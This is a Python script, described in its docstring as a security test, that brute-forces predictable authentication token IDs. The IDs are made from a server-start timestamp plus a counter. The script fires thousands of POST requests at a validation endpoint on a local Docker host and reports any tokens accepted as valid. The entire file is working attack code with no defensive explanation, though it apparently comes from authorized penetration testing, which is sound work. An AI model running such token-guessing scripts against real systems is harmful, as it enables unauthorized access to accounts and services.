#!/usr/bin/env python3
"""
Security test: Authentication weakness test via token ID brute-force.
Tests token ID predictability based on server start timestamp + counter.
"""

import requests
import time
import json

TARGET_URL = "http://host.docker.internal:4005/tokens/{tokenId}/validate"
HEADERS = {"Content-Type": "application/json"}
BODY = {}

valid_tokens = []
total_requests = 0
start_time = time.time()

def try_token(token_id):
    global total_requests
    url = TARGET_URL.replace("{tokenId}", token_id)
    try:
        resp = requests.post(url, headers=HEADERS, json=BODY, timeout=5)
        total_requests += 1
        if resp.status_code == 200:
            data = resp.json()
            if data.get("data", {}).get("valid") is True:
                print(f"\n[VALID TOKEN FOUND] Token ID: {token_id}")
                print(f"  Full response: {json.dumps(data, indent=2)}")
                valid_tokens.append((token_id, data))
                return True
        return False
    except Exception as e:
        total_requests += 1
        print(f"  [ERROR] {token_id}: {e}")
        return False


print("=" * 60)
print("Phase 1: Tight 3-second window (every 50ms), counters 0-9")
print("=" * 60)

phase1_start_ts = 1775180293000
phase1_end_ts   = 1775180296000
phase1_step     = 50
phase1_counters = range(0, 10)

phase1_tokens = [
    f"TOKEN-{ts}-{c}"
    for ts in range(phase1_start_ts, phase1_end_ts + 1, phase1_step)
    for c in phase1_counters
]

print(f"  Trying {len(phase1_tokens)} token IDs in Phase 1...")
for token_id in phase1_tokens:
    try_token(token_id)

if valid_tokens:
    print("\n[Phase 1 succeeded — skipping Phase 2]")
else:
    print("\n" + "=" * 60)
    print("Phase 2: 30-second window (every 1ms), counter 0 only")
    print("=" * 60)

    phase2_start_ts = 1775180280000
    phase2_end_ts   = 1775180310000
    phase2_step     = 1
    phase2_counters = [0]

    phase2_tokens = [
        f"TOKEN-{ts}-{c}"
        for ts in range(phase2_start_ts, phase2_end_ts + 1, phase2_step)
        for c in phase2_counters
    ]

    print(f"  Trying {len(phase2_tokens)} token IDs in Phase 2...")
    for i, token_id in enumerate(phase2_tokens):
        found = try_token(token_id)
        if found:
            break  # Stop at first hit to avoid flooding
        if i % 5000 == 0 and i > 0:
            elapsed = time.time() - start_time
            print(f"  Progress: {i}/{len(phase2_tokens)} | Elapsed: {elapsed:.1f}s | Req/s: {total_requests/elapsed:.0f}")

elapsed = time.time() - start_time

print("\n" + "=" * 60)
print("SUMMARY")
print("=" * 60)
print(f"  Total requests : {total_requests}")
print(f"  Time elapsed   : {elapsed:.2f}s")
print(f"  Avg req/s      : {total_requests/elapsed:.1f}")
print(f"  Valid tokens   : {len(valid_tokens)}")
if valid_tokens:
    print("\n  Valid token IDs discovered:")
    for tid, resp in valid_tokens:
        print(f"    - {tid}")
        print(f"      Response: {json.dumps(resp)}")
else:
    print("  No valid tokens found in the tested ranges.")
print("=" * 60)
